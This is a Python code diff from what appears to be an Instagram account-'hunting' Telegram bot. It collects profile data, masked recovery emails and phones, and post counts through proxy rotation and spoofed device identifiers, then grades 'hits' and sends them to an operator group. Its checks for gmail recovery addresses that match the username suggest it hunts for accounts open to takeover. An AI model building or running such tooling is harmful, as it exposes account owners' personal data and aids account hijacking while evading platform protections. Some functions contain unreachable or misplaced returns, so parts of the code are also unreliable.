+    phone = (contact_details.get("phone") or "").strip() or "—"
+    if pending:
+        email = email if email != "—" else "···"
+        phone = phone if phone != "—" else "···"
+    uname = (username or "").strip().lstrip("@")
+    return [
+        [
+            ("Username", f"@{uname}"),
+            ("Name", name or "—"),
+        ],
+        [
+            ("Followers", followers),
+            ("Following", following),
+            ("Posts", "···" if pending else posts_display),
+            ("Quality", quality),
+        ],
+        [
+            ("Joined", joined),
+            ("Email", email),
+            ("Phone", phone),
+        ],
+        [
+            ("Operator", _hit_operator_plain()),
+            ("User ID", resolve_operator_id(TELEGRAM_CHAT_ID) or "—"),
+            ("Support", _hit_support_plain()),
+            ("Channel", _hit_channel_plain()),
+        ],
+    ]
+
+
+def _hit_strike_quotes(username, contact_details):
+    """Strike all quote boxes when phone linked or reset match fails (gmail + letters)."""
+    details = contact_details or {}
+    phone = (details.get("phone") or "").strip()
+    email = (details.get("email") or "").strip()
+    if phone:
+        return True
+    if email and not _username_email_letters_match(username, email):
+        return True
+    return False
+
+
+def _build_box_hit_caption_parts(
+    raw_groups,
+    timestamp,
+    *,
+    strike=False,
+    tail_pad=HIT_BOX_TAIL_PAD,
+):
+    groups = _hit_box_format_groups(raw_groups, strike=strike, tail_pad=tail_pad)
+    parts = [_hit_caption_header_box(tail_pad=tail_pad)]
+    quote_boxes = [_hit_quote_pre_box(group) for group in groups]
+    quotes = "\n".join(quote_boxes)
+    if strike:
+        quotes = f"<s>{quotes}</s>"
+    parts.append(quotes)
+    parts.append(_hit_caption_footer_ts(timestamp))
+    return parts
+
+
+def _build_box_hit_caption(
+    username,
+    name,
+    followers,
+    following,
+    posts_display,
+    quality_stars,
+    contact_details,
+    timestamp,
+    *,
+    pending=False,
+):
+    raw_groups = _hit_box_row_groups(
+        username,
+        name,
+        followers,
+        following,
+        posts_display,
+        quality_stars,
+        contact_details,
+        pending=pending,
+    )
+    strike = (not pending) and _hit_strike_quotes(username, contact_details)
+    caption = ""
+    for tail_pad in HIT_BOX_TAIL_OPTIONS:
+        parts = _build_box_hit_caption_parts(
+            raw_groups, timestamp, strike=strike, tail_pad=tail_pad,
+        )
+        caption = "".join(parts)
+        if _tg_utf16_len(caption) <= TG_CAPTION_LIMIT:
+            return caption
+    return caption
+
+
+def format_hit_caption_extras():
+    """Operator ID, admin support contact, and brand channel on hit alerts."""
+    admin_load_settings()
+    op_id = resolve_operator_id(TELEGRAM_CHAT_ID)
+    lines = [tg_section("SESSION")]
+    if op_id:
+        lines.append(f"  {S['bullet']} <b>You</b>  {telegram_profile_link_html(op_id)}\n")
+        lines.append(tg_row("Your ID", op_id))
+    else:
+        lines.append(f"  {S['bullet']} <b>You</b>  <code>not linked</code>\n")
+    if _admin_settings.get("admin_ids"):
+        lines.append(f"  {S['bullet']} <b>Support</b>  {resolve_support_contact_html()}\n")
+    else:
+        lines.append(f"  {S['bullet']} <b>Support</b>  <i>admin not set</i>\n")
+    lines.append(f"  {S['bullet']} <b>Channel</b>  {admin_channel_tag()}\n")
+    return "".join(lines)
+
+
+def _mask_hit_email(value):
+    v = (value or "").strip()
+    if not v or "@" not in v:
+        return ""
+    if "*" in v or "•" in v:
+        return v
+    local, domain = v.split("@", 1)
+    local, domain = local.strip(), domain.strip()
+    if not local or not domain:
+        return ""
+    if len(local) <= 2:
+        masked_local = local[0] + "*"
+    else:
+        masked_local = local[0] + ("*" * (len(local) - 2)) + local[-1]
+    return f"{masked_local}@{domain}"
+
+
+def _looks_masked_hit_phone(value):
+    v = (value or "").strip()
+    return bool(v) and any(ch in v for ch in ("*", "•", "x", "X"))
+
+
+def _mask_hit_phone(value):
+    """Only show IG-provided masked phones — never fabricate from digits."""
+    v = (value or "").strip()
+    if not _is_valid_ig_recovery_phone(v):
+        return ""
+        return v
+
+
+def _hit_phone_for_display(value):
+    return _mask_hit_phone(value)
+
+
+def _joined_year_from_ig_info(info):
+    if not info:
+        return ""
+    for key in ("pk", "id", "pk_id"):
+        raw = info.get(key)
+        if raw is None:
+            continue
+        label = _estimate_join_year_from_user_id(str(raw))
+        if label:
+            return str(label)
+    return ""
+
+
+_HIT_WEB_UA = (
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
+    "(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
+)
+
+
+def _hit_profile_http_get(url, *, params=None, headers=None, timeout=15):
+    """Isolated GET — own IP first, proxy fallback."""
+    for attempt, proxies in enumerate(_hit_proxy_attempts(proxy_tries=_HIT_POSTS_FETCH_RETRIES)):
+        _hit_proxy_retry_pause(attempt)
+        try:
+            resp = requests.get(
+                url,
+                params=params,
+                headers=headers or {},
+                timeout=timeout,
+                proxies=proxies,
+            )
+            status = getattr(resp, "status_code", 0) if resp is not None else 0
+            if _hit_http_status_proxy_retry(status):
+                if proxies:
+                    hit_proxy_mark_bad(proxies)
+                continue
+            return resp
+        except Exception:
+            if proxies:
+                hit_proxy_mark_bad(proxies)
+            continue
+            return None
+
+
+def _hit_profile_tls_get(url, *, params=None, headers=None, timeout=20):
+    """Profile GET — own IP first, then curl/tls/requests via proxy."""
+    http, backend = _new_hit_http_session()
+    for attempt, proxies in enumerate(_hit_proxy_attempts(proxy_tries=_HIT_POSTS_FETCH_RETRIES)):
+        _hit_proxy_retry_pause(attempt)
+        try:
+            return _hit_http_get(
+                http, backend, url,
+                params=params or {}, headers=headers or {}, timeout=timeout,
+                proxies=proxies,
+            )
+        except Exception:
+            if proxies:
+                hit_proxy_mark_bad(proxies)
+            continue
+        return None
+
+
+def _fetch_hit_mobile_web_profile(username):
+    """web_profile_info via hunt mobile session — works on Termux (requests)."""
+    username = (username or "").strip().lstrip("@")
+    if not username:
+        return {}
+
+    def _profile_get(http, backend, app_id, csrf="", proxies=None):
+        headers = _hit_mobile_profile_headers()
+        headers["X-IG-App-ID"] = app_id
+        if csrf:
+            headers["X-CSRFToken"] = csrf
+        try:
+            return _hit_http_get(
+                http, backend, _HIT_LOOKUP_PROFILE_URL,
+                params={"username": username},
+                headers=headers,
+                timeout=25,
+                proxies=proxies,
+            )
+        except Exception:
+            return None
+
+    sessions: list[tuple[object, str, str]] = []
+    http, backend = _new_hit_http_session()
+    sessions.append((http, backend, ""))
+    if backend == "requests" and not _IS_TERMUX:
+        warm = requests.Session()
+        csrf = ""
+        try:
+            warm.get(
+                "https://www.instagram.com/",
+                headers={"User-Agent": _HIT_WEB_UA},
+                timeout=12,
+            )
+            csrf = warm.cookies.get("csrftoken") or ""
+        except Exception:
+            pass
+        sessions.append((warm, "requests", csrf))
+
+    app_ids = (_HIT_LOOKUP_MOBILE_APP_ID,)
+    if not _IS_TERMUX:
+        app_ids = (_HIT_LOOKUP_MOBILE_APP_ID, "936619743392459")
+
+    for http, backend, csrf in sessions:
+        for app_id in app_ids:
+            for attempt, proxies in enumerate(
+                _hit_proxy_attempts(proxy_tries=_HIT_POSTS_FETCH_RETRIES),
+            ):
+                _hit_proxy_retry_pause(attempt)
+                resp = _profile_get(http, backend, app_id, csrf, proxies)
+                if resp is None:
+                    if proxies:
+                        hit_proxy_mark_bad(proxies)
+                    continue
+                status = getattr(resp, "status_code", 0)
+                if _hit_http_status_proxy_retry(status):
+                    if proxies:
+                        hit_proxy_mark_bad(proxies)
+                    continue
+                if status == 200:
+                    try:
+                        user = (resp.json().get("data") or {}).get("user") or {}
+                    except (ValueError, TypeError, AttributeError):
+                        user = {}
+                    if user:
+                        return user
+    return {}
+
+
+def _hit_mobile_profile_headers(*, with_device_ids: bool = True):
+    headers = {
+        "X-IG-App-ID": _HIT_LOOKUP_MOBILE_APP_ID,
+        "User-Agent": _HIT_LOOKUP_MOBILE_UA,
+        "Accept-Language": "en-IN, en-US",
+        "Accept": "*/*",
+    }
+    if with_device_ids:
+        headers["X-IG-Android-ID"] = "android-" + secrets.token_hex(8)
+        headers["X-IG-Device-ID"] = str(uuid.uuid4())
+        headers["X-IG-Family-Device-ID"] = str(uuid.uuid4())
+    return headers
+
+
+def _parse_posts_count_from_html(text):
+    if not text:
+        return None
+    for pattern in (
+        _HIT_PROFILE_MEDIA_COUNT_RE,
+        _HIT_PROFILE_MEDIA_EDGE_RE,
+        _HIT_PROFILE_POSTS_COUNT_RE,
+    ):
+        match = pattern.search(text)
+        if match:
+            try:
+                return int(match.group(1))
+            except (TypeError, ValueError):
+                continue
+    return None
+
+
+def _merge_ig_info_profile_fields(info, username=None):
+    """Use fields already returned by /ig_gen before any extra IG calls."""
+    info = dict(info or {})
+    username = (username or info.get("username") or "").strip().lstrip("@")
+    hd = info.get("hd_profile_pic_url_info")
+    if isinstance(hd, dict):
+        url = (hd.get("url") or "").strip()
+        if url.startswith("http"):
+            info.setdefault("profile_pic_url_hd", url)
+            info.setdefault("profile_pic_url", url)
+    for key in ("profile_pic_url_hd", "profile_pic_url"):
+        url = (info.get(key) or "").strip()
+        if url.startswith("http"):
+            info.setdefault("profile_pic_url", url)
+            break
+    if not (info.get("full_name") or "").strip() and username:
+        info["full_name"] = username
+    return info
+
+
+def _fetch_hit_profile_via_gateway(username, pk=None, *, fast=False):
+    """Local endpoint — dedicated IG session + mobile headers for real media_count."""
+    base = get_api_base_url()
+    if not base:
+        return {}
+    params = {"username": username}
+    if pk:
+        params["pk"] = str(pk)
+    last_status = None
+    max_attempts = 1 if fast else _HIT_POSTS_FETCH_RETRIES
+    connect_timeout = min(HUNT_CONNECT_TIMEOUT, 4 if _IS_TERMUX else HUNT_CONNECT_TIMEOUT)
+    read_timeout = 10 if (fast and _IS_TERMUX) else (20 if _IS_TERMUX else 24)
+    sem_wait = 2.5 if _IS_TERMUX else 1.5
+    if not _hit_endpoint_enrich_sem.acquire(blocking=True, timeout=sem_wait):
+        return {}
+    try:
+        for attempt in range(max_attempts):
+            if attempt:
+                time.sleep(1.0 * attempt)
+            try:
+                with _hit_gateway_sem:
+                    resp = _hit_api_session.get(
+                        f"{base}/ig_profile",
+                        params=params,
+                        timeout=(connect_timeout, read_timeout),
+                    )
+                last_status = resp.status_code
+                if resp.ok:
+                    return resp.json() or {}
+                if resp.status_code == 404:
+                    log_event(
+                        "HIT PROFILE",
+                        "endpoint missing /ig_profile — git pull endpoint.py and restart start-api.sh",
+                    )
+                    return {}
+            except Exception as exc:
+                last_status = str(exc)[:40]
+                if attempt + 1 >= max_attempts:
+                    log_event("HIT PROFILE", f"ig_profile error: {str(exc)[:80]}")
+        if last_status is not None:
+            log_event("HIT PROFILE", f"ig_profile HTTP {last_status}")
+        return {}
+    finally:
+        _hit_endpoint_enrich_sem.release()
+
+
+def _scrape_posts_count_from_profile_page(username):
+    """Last-resort posts count — parse public profile HTML with proxy retries."""
+    username = (username or "").strip().lstrip("@")
+    if not username:
+        return None
+    url = f"https://www.instagram.com/{quote(username)}/"
+    mobile_headers = {
+        **_hit_mobile_profile_headers(),
+        "Accept": "text/html",
+    }
+    web_headers = {
+        "User-Agent": _HIT_WEB_UA,
+        "Accept-Language": "en-US,en;q=0.9",
+        "Accept": "text/html",
+    }
+    for headers in (mobile_headers, web_headers):
+        for _ in range(_HIT_POSTS_FETCH_RETRIES):
+            tls_resp = _hit_profile_tls_get(url, headers=headers, timeout=22)
+            if tls_resp is not None and getattr(tls_resp, "status_code", 0) == 200:
+                mc = _parse_posts_count_from_html(getattr(tls_resp, "text", "") or "")
+                if mc is not None:
+                    return mc
+            resp = _hit_profile_http_get(url, headers=headers, timeout=18)
+            if resp is not None and resp.ok:
+                mc = _parse_posts_count_from_html(resp.text or "")
+                if mc is not None:
+                    return mc
+            time.sleep(0.8 + random.uniform(0.2, 0.6))
+    return None
+
+
+def _apply_gateway_profile_to_info(info, profile):
+    if not profile:
+        return info
+    info = dict(info or {})
+    name = (profile.get("full_name") or "").strip()
+    if name:
+        info["full_name"] = name
+    mc = profile.get("media_count")
+    if mc is None or mc == "":
+        edge = profile.get("edge_owner_to_timeline_media")
+        if isinstance(edge, dict) and edge.get("count") is not None:
+            mc = edge.get("count")
+    if mc is not None and mc != "":
+        info["media_count"] = mc
+    edge_followers = profile.get("edge_followed_by")
+    if isinstance(edge_followers, dict) and edge_followers.get("count") is not None:
+        info.setdefault("follower_count", edge_followers.get("count"))
+    edge_following = profile.get("edge_follow")
+    if isinstance(edge_following, dict) and edge_following.get("count") is not None:
+        info.setdefault("following_count", edge_following.get("count"))
+    for key in ("profile_pic_url_hd", "profile_pic_url"):
+        url = (profile.get(key) or "").strip()
+        if url.startswith("http"):
+            info[key] = url
+            break
+    hd = profile.get("hd_profile_pic_url_info")
+    if isinstance(hd, dict):
+        url = (hd.get("url") or "").strip()
+        if url.startswith("http"):
+            info["profile_pic_url_hd"] = url
+            info.setdefault("profile_pic_url", url)
+    return info
+
+
+def _fetch_ig_web_profile(username):
+    """Name, pfp, posts — mobile API first (Termux-safe), then proxy HTTP fallback."""
+    username = (username or "").strip().lstrip("@")
+    if not username:
+        return {}
+    user = _fetch_hit_mobile_web_profile(username)
+    if user:
+        return user
+    attempts = (
+        {"X-IG-App-ID": _HIT_LOOKUP_MOBILE_APP_ID, "User-Agent": _HIT_LOOKUP_MOBILE_UA},
+        {"X-IG-App-ID": "936619743392459", "User-Agent": _HIT_WEB_UA},
+    )
+    for headers in attempts:
+        for retry in range(_HIT_POSTS_FETCH_RETRIES):
+            if retry:
+                time.sleep(1.5 * retry + random.uniform(0.3, 0.8))
+            resp = _hit_profile_http_get(
+                _HIT_LOOKUP_PROFILE_URL,
+                params={"username": username},
+                headers=headers,
+                timeout=16,
+            )
+            if resp is None:
+                continue
+            if resp.status_code in (429, 502, 503, 504):
+                continue
+            if resp.ok:
+                try:
+                    user = (resp.json().get("data") or {}).get("user") or {}
+                except (ValueError, TypeError, AttributeError):
+                    user = {}
+                if user:
+                    return user
+    return {}
+
+
+def _profile_pic_url_from_ig_info(info, username=None):
+    info = info or {}
+    for key in ("profile_pic_url_hd", "profile_pic_url"):
+        url = (info.get(key) or "").strip()
+        if url.startswith("http"):
+            return url
+    for nested in ("hd_profile_pic_url_info", "profile_pic_url_hd_info"):
+        block = info.get(nested)
+        if isinstance(block, dict):
+            url = (block.get("url") or "").strip()
+            if url.startswith("http"):
+                return url
+    return None
+
+
+def _resolve_hit_posts_count(username, info, *, max_rounds=None):
+    """Own IP first, then proxies — mobile API, gateway, web, HTML scrape."""
+    info = dict(info or {})
+    if _posts_count_from_ig_info(info) is not None:
+        return info
+    rounds = _HIT_POSTS_FETCH_ROUNDS if max_rounds is None else max(1, int(max_rounds))
+    for round_idx in range(rounds):
+        mobile_user = _fetch_hit_mobile_web_profile(username)
+        if mobile_user:
+            info = _apply_gateway_profile_to_info(info, mobile_user)
+        if _posts_count_from_ig_info(info) is not None:
+            return info
+
+        pk = info.get("pk") or info.get("id")
+        gateway = _fetch_hit_profile_via_gateway(username, pk)
+        info = _apply_gateway_profile_to_info(info, gateway)
+        if _posts_count_from_ig_info(info) is not None:
+            return info
+
+        web_user = _fetch_ig_web_profile(username)
+        if web_user:
+            info = _apply_gateway_profile_to_info(info, web_user)
+        if _posts_count_from_ig_info(info) is not None:
+            return info
+
+        scraped = _scrape_posts_count_from_profile_page(username)
+        if scraped is not None:
+            info["media_count"] = scraped
+            return info
+
+        if round_idx + 1 < rounds:
+            log_event(
+                "HIT PROFILE",
+                f"@{username} posts retry {round_idx + 2}/{rounds}",
+            )
+            pause = (1.2 + round_idx * 0.8) if _IS_TERMUX else (0.5 + round_idx * 0.35)
+            time.sleep(pause)
+    return info
+
+
+def _enrich_hit_profile_light(username, info, *, skip_gateway=False, hunt_safe=False):
+    """Fast profile pass — hunt_safe skips all extra IG calls so hunt never stalls."""
+    info = _merge_ig_info_profile_fields(info, username)
+    if hunt_safe:
+        return info
+    if not skip_gateway and _posts_count_from_ig_info(info) is None:
+        pk = info.get("pk") or info.get("id")
+        gateway = _fetch_hit_profile_via_gateway(username, pk, fast=True)
+        info = _apply_gateway_profile_to_info(info, gateway)
+    need_name = not (info.get("full_name") or "").strip()
+    need_pfp = not _profile_pic_url_from_ig_info(info, username)
+    if need_name or need_pfp:
+        mobile_user = _fetch_hit_mobile_web_profile(username)
+        if mobile_user:
+            info = _apply_gateway_profile_to_info(info, mobile_user)
+    return _merge_ig_info_profile_fields(info, username)
+
+
+def _enrich_ig_info_for_hit(username, info):
+    """Full profile enrich (slow) — use after contact patch when posts still missing."""
+    info = _enrich_hit_profile_light(username, info)
+    if _posts_count_from_ig_info(info) is None:
+        info = _resolve_hit_posts_count(username, info)
+    return _merge_ig_info_profile_fields(info, username)
+
+
+def _posts_count_from_ig_info(info):
+    if not info:
+        return None
+    mc = info.get("media_count")
+    if mc is not None and mc != "":
+        return mc
+    edge = info.get("edge_owner_to_timeline_media")
+    if isinstance(edge, dict) and edge.get("count") is not None:
+        return edge.get("count")
+    return None
+
+
+def _hit_display_name(info, username):
+    name = (info.get("full_name") or "").strip()
+    if name:
+        return name
+    uname = (username or (info or {}).get("username") or "").strip().lstrip("@")
+    return uname or "N/A"
+
+
+def _parse_hit_profile_photo_response(resp):
+    if resp is None or not getattr(resp, "ok", False):
+        return None, None
+    content = resp.content or b""
+    if len(content) <= 256:
+        return None, None
+    ctype = (resp.headers.get("Content-Type") or "image/jpeg").split(";")[0].strip()
+    if "image" in ctype or content[:3] == b"\xff\xd8\xff" or content[:4] == b"\x89PNG":
+        return content, ctype
+    return None, None
+
+
+def _download_hit_profile_photo_once(url):
+    """Try proxy HTTP then TLS/curl — one pass per URL."""
+    headers = {
+        "Referer": "https://www.instagram.com/",
+        "User-Agent": _HIT_WEB_UA,
+        "Accept": "image/avif,image/webp,image/apng,image/*,*/*;q=0.8",
+    }
+    for getter in (_hit_profile_http_get, _hit_profile_tls_get):
+        try:
+            photo, ctype = _parse_hit_profile_photo_response(
+                getter(url, headers=headers, timeout=22)
+            )
+            if photo:
+                return photo, ctype
+        except Exception:
+            continue
+    return None, None
+
+
+def _download_hit_profile_photo(url):
+    url = (url or "").strip()
+    if not url.startswith("http"):
+        return None, None
+    for attempt in range(1, _HIT_PFP_DOWNLOAD_RETRIES + 1):
+        photo, ctype = _download_hit_profile_photo_once(url)
+        if photo:
+            return photo, ctype
+        if attempt < _HIT_PFP_DOWNLOAD_RETRIES:
+            time.sleep(1.0 * attempt + random.uniform(0.4, 1.0))
+    return None, None
+
+
+def _refresh_hit_pfp_url(username, info):
+    """Re-fetch IG profile to pick up a fresh CDN profile-pic URL."""
+    info = dict(info or {})
+    mobile = _fetch_hit_mobile_web_profile(username)
+    if mobile:
+        info = _apply_gateway_profile_to_info(info, mobile)
+    web_user = _fetch_ig_web_profile(username)
+    if web_user:
+        info = _apply_gateway_profile_to_info(info, web_user)
+    return info, _profile_pic_url_from_ig_info(info, username)
+
+
+def _fetch_hit_profile_photo_bytes(username, info, pfp_url):
+    """Download hit PFP — retry downloads and refresh URL between rounds."""
+    url = (pfp_url or "").strip()
+    cur_info = dict(info or {})
+    last_url = ""
+    for round_idx in range(_HIT_PFP_REFRESH_ROUNDS):
+        if not url or not url.startswith("http"):
+            cur_info, url = _refresh_hit_pfp_url(username, cur_info)
+            if not url:
+                if round_idx + 1 < _HIT_PFP_REFRESH_ROUNDS:
+                    time.sleep(2.0 + round_idx * 1.2)
+                    continue
+                break
+        if url != last_url:
+            last_url = url
+        photo_bytes, content_type = _download_hit_profile_photo(url)
+        if photo_bytes:
+            return photo_bytes, content_type, cur_info
+        if round_idx + 1 < _HIT_PFP_REFRESH_ROUNDS:
+            log_event(
+                "PFP FETCH",
+                f"@{username} round {round_idx + 1}/{_HIT_PFP_REFRESH_ROUNDS} failed — refresh + retry",
+            )
+            time.sleep(2.0 + round_idx * 1.5)
+            cur_info, fresh_url = _refresh_hit_pfp_url(username, cur_info)
+            if fresh_url:
+                url = fresh_url
+    return None, None, cur_info
+
+
+def _quick_hit_pfp_bytes(pfp_url):
+    """One-shot PFP for fast Telegram delivery — no refresh rounds."""
+    url = (pfp_url or "").strip()
+    if not url.startswith("http"):
+        return None, "image/jpeg"
+    photo, ctype = _download_hit_profile_photo_once(url)
+    return photo, (ctype or "image/jpeg")
+
+
+def _hit_recovery_section_header(title="RECOVERY"):
+    bar = S["section"] * 3
+    return f"\n<b>{bar} {title} {bar}</b>\n"
+
+
+def _edit_hit_operator_group_message(group_id, message_id, caption, hit_keyboard, is_photo):
+    """Edit the same hit alert in-place (caption or text)."""
+    if not group_id or not message_id or not caption:
+        return False
+    if is_photo and _tg_utf16_len(caption) > TG_CAPTION_LIMIT:
+        return False
+    safe_kb = sanitize_inline_keyboard_urls(hit_keyboard)
+    if is_photo:
+        data = {
+            "chat_id": group_id,
+            "message_id": int(message_id),
+            "caption": caption,
+            "parse_mode": "HTML",
+        }
+        method = "editMessageCaption"
+    else:
+        data = {
+            "chat_id": group_id,
+            "message_id": int(message_id),
+            "text": caption,
+            "parse_mode": "HTML",
+        }
+        method = "editMessageText"
+    if safe_kb:
+        data["reply_markup"] = json.dumps(safe_kb)
+    resp = telegram_post_with_retries(
+        method,
+        data=data,
+        timeout=max(TIMEOUT, TG_SEND_TIMEOUT),
+        max_retries=TG_HIT_EDIT_MAX_RETRIES,
+        label="HIT GRP EDIT",
+        fail_fast_400=True,
+    )
+    if resp is None:
+        return "fail"
+    try:
+        desc = (resp.json().get("description") or "").lower()
+        if "message is not modified" in desc:
+            return "unchanged"
+    except Exception:
+        pass
+    return "edited"
+
+
+def _finalize_hit_operator_delivery(
+    group_id,
+    message_id,
+    caption,
+    hit_keyboard,
+    is_photo,
+    photo_bytes,
+    content_type,
+):
+    """Caption-only in-place edit — instant alert already carries the photo."""
+    if not group_id or not message_id:
+        _hit_tg_rate_wait()
+        return deliver_hit_to_operator_group(
+            caption, hit_keyboard, photo_bytes, content_type,
+        )
+    if is_photo and _tg_utf16_len(caption) > TG_CAPTION_LIMIT:
+        _hit_tg_rate_wait()
+        delivered, new_id, new_photo = deliver_hit_to_operator_group(
+            caption, hit_keyboard, photo_bytes, content_type,
+        )
+        if delivered:
+            delete_telegram_message(group_id, message_id)
+        return delivered, new_id, new_photo
+    edit_out = _edit_hit_operator_group_message(
+        group_id, message_id, caption, hit_keyboard, is_photo,
+    )
+    if edit_out in ("edited", "unchanged"):
+        return True, message_id, is_photo
+    _hit_tg_rate_wait()
+    delivered, new_id, new_photo = deliver_hit_to_operator_group(
+        caption, hit_keyboard, photo_bytes, content_type,
+    )
+    if delivered:
+        delete_telegram_message(group_id, message_id)
+    return delivered, new_id, new_photo
+
+
+def _hit_tg_rate_wait():
+    """Space hit-group posts — mobile networks + Telegram flood limits."""
+    global _hit_tg_last_send_mono
+    with _hit_tg_send_lock:
+        gap = time.monotonic() - _hit_tg_last_send_mono
+        wait = HIT_TG_MIN_INTERVAL_SEC - gap
+        if wait > 0:
+            time.sleep(wait)
+        _hit_tg_last_send_mono = time.monotonic()
+
+
+def _enqueue_hit_tg_retry(username, caption, hit_keyboard, photo_bytes, content_type):
+    with _hit_tg_retry_lock:
+        if len(_hit_tg_retry_pending) >= 200:
+            _hit_tg_retry_pending.pop(0)
+        _hit_tg_retry_pending.append({
+            "username": username,
+            "caption": caption,
+            "keyboard": hit_keyboard,
+            "photo_bytes": photo_bytes,
+            "content_type": content_type or "image/jpeg",
+            "tries": 0,
+            "at": time.time(),
+        })
+
+
+def _hit_tg_retry_loop():
+    while True:
+        time.sleep(6)
+        if not TELEGRAM_ENABLED:
+            continue
+        with _hit_tg_retry_lock:
+            if not _hit_tg_retry_pending:
+                continue
+            batch = []
+            while _hit_tg_retry_pending and len(batch) < 18:
+                batch.append(_hit_tg_retry_pending.pop(0))
+        retry_later = []
+        for item in batch:
+            item["tries"] = int(item.get("tries") or 0) + 1
+            _hit_tg_rate_wait()
+            ok, _, _ = deliver_hit_to_operator_group(
+                item["caption"],
+                item["keyboard"],
+                item.get("photo_bytes"),
+                item.get("content_type") or "image/jpeg",
+            )
+            if ok:
+                log_event("HIT RETRY", f"@{item.get('username')} delivered on retry")
+            elif item["tries"] < HIT_TG_RETRY_MAX:
+                retry_later.append(item)
+            else:
+                log_event(
+                    "HIT FAIL",
+                    f"@{item.get('username')} dropped after {item['tries']} TG retries",
+                )
+        if retry_later:
+            with _hit_tg_retry_lock:
+                _hit_tg_retry_pending.extend(retry_later)
+
+
+def start_hit_tg_retry_monitor():
+    global _hit_tg_retry_started
+    if _hit_tg_retry_started:
+        return
+    _hit_tg_retry_started = True
+    threading.Thread(
+        target=_hit_tg_retry_loop, daemon=True, name="hit-tg-retry",
+    ).start()
+
+
+def _format_hit_instant_pipeline_block():
+    """Live pipeline card — fills in on enrich edit."""
+    w = 8
+    return (
+        tg_section("PIPELINE")
+        + f"  {S['bullet']} Profile   <code>{tg_progress(45, w)}</code>  <i>live</i>\n"
+        + f"  {S['bullet']} Contact   <code>{tg_progress(8, w)}</code>  <i>sync</i>\n"
+        + f"  {S['bullet']} Quality   <code>{tg_progress(0, w)}</code>  <i>queued</i>\n"
+    )
+
+
+def _format_hit_instant_recovery_stub():
+    """Recovery placeholders — replaced after enrich."""
+    header = _hit_recovery_section_header()
+    return (
+        header
+        + f"  {S['bullet']} Email     <code>—</code>\n"
+        + f"  {S['bullet']} Phone     <code>—</code>\n"
+        + f"  {S['bullet']} Joined    <code>—</code>\n"
+    )
+
+
+def _compose_hit_instant_stub_message(username, info, contact_details=None):
+    """Instant alert stub — enrich upgrades to full capture card."""
+    info = _merge_ig_info_profile_fields(dict(info or {}), username)
+    contact_details = dict(contact_details or _hit_contact_seed_from_info(info))
+    name = _hit_display_name(info, username)
+    followers = info.get("follower_count", "N/A")
+    following = info.get("following_count", "N/A")
+    username_safe = html.escape(username)
+    timestamp = datetime.now(timezone.utc).strftime("%d %b %Y • %H:%M UTC")
+    caption = _build_box_hit_caption(
+        username,
+        name,
+        followers,
+        following,
+        "···",
+        1,
+        contact_details,
+        timestamp,
+        pending=True,
+    )
+    keyboard = create_hit_keyboard(username_safe)
+    photo_bytes = None
+    content_type = "image/jpeg"
+    pfp = _profile_pic_url_from_ig_info(info, username) or "N/A"
+    if pfp != "N/A":
+        try:
+            photo_bytes, content_type = _quick_hit_pfp_bytes(pfp)
+        except Exception:
+            photo_bytes = None
+    return caption, keyboard, photo_bytes, content_type, 1, name, "N/A", contact_details
+
+
+def _compose_hit_group_message(username, info, contact_details=None, *, skip_pfp=False):
+    """Build hit caption + keyboard; photo only on instant send (skip_pfp for caption edits)."""
+    info = _merge_ig_info_profile_fields(dict(info or {}), username)
+    contact_details = dict(contact_details or {})
+    name = _hit_display_name(info, username)
+    followers = info.get("follower_count", "N/A")
+    following = info.get("following_count", "N/A")
+    posts_raw = _posts_count_from_ig_info(info)
+    posts_display = str(posts_raw) if posts_raw is not None else "N/A"
+    username_safe = html.escape(username)
+    timestamp = datetime.now(timezone.utc).strftime("%d %b %Y • %H:%M UTC")
+    quality_stars = _calculate_hit_quality_stars(
+        username, name, followers, posts_raw, contact_details,
+    )
+    caption = _build_box_hit_caption(
+        username,
+        name,
+        followers,
+        following,
+        posts_display,
+        quality_stars,
+        contact_details,
+        timestamp,
+    )
+    keyboard = create_hit_keyboard(username_safe)
+    photo_bytes = None
+    content_type = "image/jpeg"
+    if not skip_pfp:
+        pfp = _profile_pic_url_from_ig_info(info, username) or "N/A"
+        if pfp != "N/A":
+            try:
+                photo_bytes, content_type = _quick_hit_pfp_bytes(pfp)
+            except Exception:
+                photo_bytes = None
+    return caption, keyboard, photo_bytes, content_type, quality_stars, name, posts_display, contact_details
+
+
+def _hit_tg_cache_key(username):
+    return (username or "").strip().lstrip("@").lower()
+
+
+def _hit_tg_cache_put(username, group_id, msg_id, is_photo):
+    key = _hit_tg_cache_key(username)
+    if not key or not group_id or not msg_id:
+        return
+    with _hit_tg_msg_lock:
+        _hit_tg_msg_cache[key] = {
+            "group_id": str(group_id),
+            "msg_id": int(msg_id),
+            "is_photo": bool(is_photo),
+            "at": time.time(),
+        }
+
+
+def _hit_tg_cache_get(username):
+    key = _hit_tg_cache_key(username)
+    if not key:
+        return None
+    with _hit_tg_msg_lock:
+        row = _hit_tg_msg_cache.get(key)
+    if not row:
+        return None
+    if time.time() - float(row.get("at") or 0) > HIT_TG_MSG_CACHE_TTL:
+        with _hit_tg_msg_lock:
+            _hit_tg_msg_cache.pop(key, None)
+        return None
+    return dict(row)
+
+
+def _hit_tg_user_lock(username):
+    key = _hit_tg_cache_key(username)
+    with _hit_tg_user_locks_guard:
+        lock = _hit_tg_user_locks.get(key)
+        if lock is None:
+            lock = threading.Lock()
+            _hit_tg_user_locks[key] = lock
+        return lock
+
+
+def _wait_hit_tg_cache(username, timeout=15.0):
+    deadline = time.monotonic() + timeout
+    while time.monotonic() < deadline:
+        row = _hit_tg_cache_get(username)
+        if row and row.get("msg_id"):
+            return row
+        time.sleep(0.12)
+    return None
+
+
+def _hit_upgrade_group_message(username, caption, hit_keyboard, photo_bytes, content_type):
+    """Edit instant hit caption in-place — photo already on the instant message."""
+    gid = get_operator_hit_group_id()
+    if not gid or not caption:
+        return False, None, False, "fail"
+    cached = _hit_tg_cache_get(username)
+    if cached and str(cached.get("group_id")) == str(gid) and cached.get("msg_id"):
+        msg_id = int(cached["msg_id"])
+        is_photo = bool(cached.get("is_photo"))
+        edit_out = _edit_hit_operator_group_message(
+            gid, msg_id, caption, hit_keyboard, is_photo,
+        )
+        if edit_out in ("edited", "unchanged"):
+            return True, msg_id, is_photo, edit_out
+        upgraded, new_id, new_photo = _finalize_hit_operator_delivery(
+            gid, msg_id, caption, hit_keyboard, is_photo, photo_bytes, content_type,
+        )
+        if upgraded and new_id:
+            _hit_tg_cache_put(username, gid, new_id, new_photo)
+            return upgraded, new_id, new_photo, "resent"
+        return upgraded, new_id, new_photo, "fail"
